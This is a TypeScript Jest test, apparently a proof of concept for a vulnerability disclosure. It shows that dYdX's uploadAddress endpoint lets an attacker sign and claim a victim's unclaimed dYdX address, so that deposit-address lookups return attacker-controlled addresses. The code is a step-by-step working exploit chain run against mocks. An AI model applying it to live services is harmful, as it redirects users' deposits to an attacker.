/**
 * PoC: Unclaimed dYdX address squatting via POST /v4/turnkey/uploadAddress
 *
 * Proves the correct bug chain (not "replay", not victim-suborg takeover):
 *
 * 1. Attacker Turnkey row A and victim Turnkey row B both have no dydx_address yet.
 * 2. Attacker signs the *victim's intended* Cosmos address V with the *attacker's* EVM key.
 * 3. uploadAddress accepts: recovered EVM → attacker row → stores V on attacker row.
 * 4. GET /v4/bridging/getDepositAddress/V resolves via findByDydxAddress(V) and returns
 *    attacker's evm / svm / smart-account (exposed as `avalancheAddress` in JSON).
 * 5. Victim signs V with victim EVM and calls uploadAddress → fails (unique dydx / cannot claim).
 *
 * Core issue: uploadAddress only checks "some Turnkey user signed the string V"; it does not
 * prove the signer controls the Cosmos key that owns V.
 *
 * Mocks: in-memory TurnkeyUsersTable + PolicyEngine + Alchemy webhook (no Postgres/Redis).
 */

import express from 'express';
import request from 'supertest';
import { privateKeyToAccount } from 'viem/accounts';

import type { TurnkeyUserFromDatabase } from '@dydxprotocol-indexer/postgres';

const ATTACKER_PK =
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' as const;
const VICTIM_PK =
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d' as const;

/** Victim's intended dYdX bech32 address V (squatted by attacker in this PoC). */
const victimDydxAddress = 'dydx1234567890123456789012345678901234567890';

const attackerEvm = privateKeyToAccount(ATTACKER_PK);
const victimEvm = privateKeyToAccount(VICTIM_PK);

const mockRowsBySuborg = new Map<string, TurnkeyUserFromDatabase>();

function row(
  partial: Omit<TurnkeyUserFromDatabase, 'created_at'> & { created_at?: string },
): TurnkeyUserFromDatabase {
  return {
    ...partial,
    created_at: partial.created_at ?? new Date().toISOString(),
  } as TurnkeyUserFromDatabase;
}

jest.mock('../../../../src/config', () => {
  const actual = jest.requireActual<{ default: Record<string, unknown> }>('../../../../src/config');
  return {
    __esModule: true,
    default: {
      ...actual.default,
      RATE_LIMIT_ENABLED: false,
      INDEXER_INTERNAL_IPS: '127.0.0.1',
    },
  };
});

jest.mock('../../../../src/helpers/alchemy-helpers', () => ({
  ...jest.requireActual('../../../../src/helpers/alchemy-helpers'),
  addAddressesToAlchemyWebhook: jest.fn().mockResolvedValue(undefined),
}));

jest.mock('../../../../src/helpers/policy-engine', () => ({
  PolicyEngine: jest.fn().mockImplementation(() => ({
    configurePolicy: jest.fn().mockResolvedValue(undefined),
    configureSolanaPolicy: jest.fn().mockResolvedValue(undefined),
    removeSelfFromRootQuorum: jest.fn().mockResolvedValue(undefined),
    getAPIUserId: jest.fn().mockResolvedValue('mock-api-user-id'),
  })),
}));

jest.mock('@dydxprotocol-indexer/postgres', () => {
  const actual = jest.requireActual('@dydxprotocol-indexer/postgres');
  return {
    __esModule: true,
    ...actual,
    TurnkeyUsersTable: {
      findByEvmAddress: jest.fn(),
      findByDydxAddress: jest.fn(),
      updateDydxAddressByEvmAddress: jest.fn(),
    },
  };
});

import { TurnkeyUsersTable } from '@dydxprotocol-indexer/postgres';
import * as alchemyHelpers from '../../../../src/helpers/alchemy-helpers';
import { PolicyEngine } from '../../../../src/helpers/policy-engine';
import { router as TurnkeyRouter } from '../../../../src/controllers/api/v4/turnkey-controller';
import BridgeRouter from '../../../../src/controllers/api/v4/skip-bridge-controller';

function mockSuborgRow(
  suborgId: string,
  email: string,
  evmAddress: string,
  svmAddress: string,
  smartAccountAddress: string,
): void {
  mockRowsBySuborg.set(
    suborgId,
    row({
      suborg_id: suborgId,
      email,
      salt: `${suborgId}-salt`,
      evm_address: evmAddress,
      svm_address: svmAddress,
      smart_account_address: smartAccountAddress,
      dydx_address: undefined,
    }),
  );
}

function installTurnkeyUsersTableMocks(): void {
  (TurnkeyUsersTable.findByEvmAddress as jest.Mock).mockImplementation(async (evm: string) => {
    const want = evm.toLowerCase();
    for (const r of mockRowsBySuborg.values()) {
      if (r.evm_address.toLowerCase() === want) {
        return { ...r };
      }
    }
    return undefined;
  });
  (TurnkeyUsersTable.findByDydxAddress as jest.Mock).mockImplementation(async (dydx: string) => {
    for (const r of mockRowsBySuborg.values()) {
      if (r.dydx_address === dydx) {
        return { ...r };
      }
    }
    return undefined;
  });
  /** Mimics UNIQUE(dydx_address): second claimant for the same Cosmos address fails. */
  (TurnkeyUsersTable.updateDydxAddressByEvmAddress as jest.Mock).mockImplementation(
    async (evm: string, dydxAddress: string) => {
      const want = evm.toLowerCase();
      let target: TurnkeyUserFromDatabase | undefined;
      for (const r of mockRowsBySuborg.values()) {
        if (r.evm_address.toLowerCase() === want) {
          target = r;
          break;
        }
      }
      if (!target) {
        return undefined;
      }
      for (const r of mockRowsBySuborg.values()) {
        if (r.suborg_id !== target.suborg_id && r.dydx_address === dydxAddress) {
          const err = new Error(
            'duplicate key value violates unique constraint "turnkey_users_dydx_address_unique"',
          );
          (err as NodeJS.ErrnoException).code = '23505';
          throw err;
        }
      }
      target.dydx_address = dydxAddress;
      return { ...target };
    },
  );
}

function installPolicyEngineAndAlchemyMocks(): void {
  (PolicyEngine as unknown as jest.Mock).mockImplementation(() => ({
    configurePolicy: jest.fn().mockResolvedValue(undefined),
    configureSolanaPolicy: jest.fn().mockResolvedValue(undefined),
    removeSelfFromRootQuorum: jest.fn().mockResolvedValue(undefined),
    getAPIUserId: jest.fn().mockResolvedValue('mock-api-user-id'),
  }));
  jest.mocked(alchemyHelpers.addAddressesToAlchemyWebhook).mockResolvedValue(undefined);
}

describe('PoC: uploadAddress squats unclaimed victim dYdX address (deposit lookup hijack)', () => {
  let app: express.Express;

  beforeAll(() => {
    app = express()
      .use(express.json())
      .use('/v4/turnkey', TurnkeyRouter)
      .use('/v4/bridging', BridgeRouter);
  });

  beforeEach(() => {
    mockRowsBySuborg.clear();
    mockSuborgRow(
      'attacker-suborg',
      'attacker@example.com',
      attackerEvm.address,
      'svmAttacker123456789012345678901234567890',
      '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
    );
    mockSuborgRow(
      'victim-suborg',
      'victim@example.com',
      victimEvm.address,
      'svmVictim12345678901234567890123456789012',
      '0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb',
    );
    installTurnkeyUsersTableMocks();
    installPolicyEngineAndAlchemyMocks();
  });

  it('asserts full chain: attacker signs V; V binds to attacker row; deposit keys leak; victim blocked', async () => {
    const attackerUser = mockRowsBySuborg.get('attacker-suborg')!;
    const victimUser = mockRowsBySuborg.get('victim-suborg')!;

    // --- (1) Before attack: neither row has a Cosmos dYdX address bound ---
    expect(attackerUser.dydx_address ?? null).toBeNull();
    expect(victimUser.dydx_address ?? null).toBeNull();

    // --- (2) Attacker signs victim's Cosmos address V with attacker EVM; upload ---
    const attackerSignature = await attackerEvm.signMessage({ message: victimDydxAddress });

    const uploadAttackerRes = await request(app)
      .post('/v4/turnkey/uploadAddress')
      .send({ dydxAddress: victimDydxAddress, signature: attackerSignature });

    expect(uploadAttackerRes.status).toBe(200);
    expect(uploadAttackerRes.body).toEqual({ success: true });

    // --- (3) After attack: V is on attacker row only ---
    expect(mockRowsBySuborg.get('attacker-suborg')?.dydx_address).toBe(victimDydxAddress);
    expect(mockRowsBySuborg.get('victim-suborg')?.dydx_address ?? null).toBeNull();

    // --- (4) Deposit address for V returns attacker-controlled keys (API: avalancheAddress = smart account) ---
    const depositRes = await request(app).get(
      `/v4/bridging/getDepositAddress/${encodeURIComponent(victimDydxAddress)}`,
    );

    expect(depositRes.status).toBe(200);
    expect(depositRes.body.evmAddress).toBe(attackerUser.evm_address);
    expect(depositRes.body.svmAddress).toBe(attackerUser.svm_address);
    expect(depositRes.body.avalancheAddress).toBe(attackerUser.smart_account_address);

    // --- (5) Victim cannot later claim V (unique dydx / already taken) ---
    const victimSignature = await victimEvm.signMessage({ message: victimDydxAddress });

    const uploadVictimRes = await request(app)
      .post('/v4/turnkey/uploadAddress')
      .send({ dydxAddress: victimDydxAddress, signature: victimSignature });

    expect(uploadVictimRes.status).toBeGreaterThanOrEqual(400);
    expect(mockRowsBySuborg.get('victim-suborg')?.dydx_address ?? null).toBeNull();
    expect(mockRowsBySuborg.get('attacker-suborg')?.dydx_address).toBe(victimDydxAddress);
  });
});
